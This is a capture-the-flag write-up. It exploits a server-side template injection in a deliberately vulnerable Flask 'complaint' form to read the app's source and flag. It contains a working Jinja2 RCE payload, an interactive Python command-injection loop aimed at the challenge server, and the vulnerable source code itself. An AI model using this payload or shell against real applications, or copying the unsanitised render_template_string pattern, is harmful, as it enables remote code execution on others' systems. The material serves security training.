# I Have Objections

## Description

Ok, I'm a little nervous about this one. It seemed like a good idea when I came up with it and I suppose it's too late to back out now... This next challenge will involve compromising a live stream site and to make sure it's as real as possible, I've set up a camera and will be broadcasting LIVE 24/7 until the end of the contest! Join right away, and you'll be treated to a little behind-the-scenes walk-through of Prof Johnson's lab and while you're there see if you can find the flag!  
  
> NOTE: Since this is a 100-level challenge, let me save you a little time: /flag  
  
[I'm Ready for my Close Up, Mr. Demille](http://34.135.223.176:8449/)  
  
[Don't Worry, It's an Old Reference, Even for Me](https://www.youtube.com/watch?v=TVi1NlYBljU)

## Solution

![I Have Objections.png](/assets/ctf/uwsp/i-have-objections.png)

We can submit a complaint on `/complaint` route.

Seemed like an SSTI vulnerability, test:

![I Have Objections-1.png](/assets/ctf/uwsp/i-have-objections-1.png)

[https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

Example payload:
```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

Interactive command injection:
```python
from requests import Session
from bs4 import BeautifulSoup as BS

URL = 'http://34.135.223.176:8449/complaint'
PAYLOAD = '{{ cycler.__init__.__globals__.os.popen("%s").read() }}'

with Session() as session:
    while True:
        payload = PAYLOAD % input('Command: ')
        resp = session.post(URL, data={'complaint': payload})
        output = BS(resp.text, 'html.parser').find('p').get_text()
        print(output)
```

I thought hint meant flag was on `/flag`, but it's a route and `app.py` just discloses it.
```bash
Command: ls -alh
Your complaint: total 28K
drwxr-xr-x 4 root     root     4.0K Oct 20 17:59 .
drwxr-xr-x 8 cjohn745 cjohn745 4.0K Oct 22 02:57 ..
-rw-r--r-- 1 cjohn745 cjohn745  11K Oct 20 17:59 app.py      
drwxr-xr-x 2 root     root     4.0K Oct 18 20:36 static      
drwxr-xr-x 5 cjohn745 cjohn745 4.0K Oct 18 20:39 web100-2_env

Command: ls /flag
Your complaint: 
Command: cat app.py
Your complaint: from flask import Flask, request, render_template_string

app = Flask(__name__)

# Frozen stream route with a fake chatbox
@app.route('/')
def frozen_stream():
    return '''...'''

# Vulnerable complaint form route
@app.route('/complaint', methods=['GET', 'POST'])
def complaint_form():
    if request.method == 'POST':
        # Vulnerable - input is reflected without sanitization
        complaint = request.form.get('complaint')
        return render_template_string(f'''...''')

# Hidden flag route (only accessible via XHR)
@app.route('/flag')
def flag():
    if request.headers.get("X-Requested-With") == "XMLHttpRequest":
        return jsonify({"flag": "poctf{uwsp_71m3_15_4n_1llu510n}"})
    return "Access Denied", 403

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8449)
```

> Flag: `poctf{uwsp_71m3_15_4n_1llu510n}`

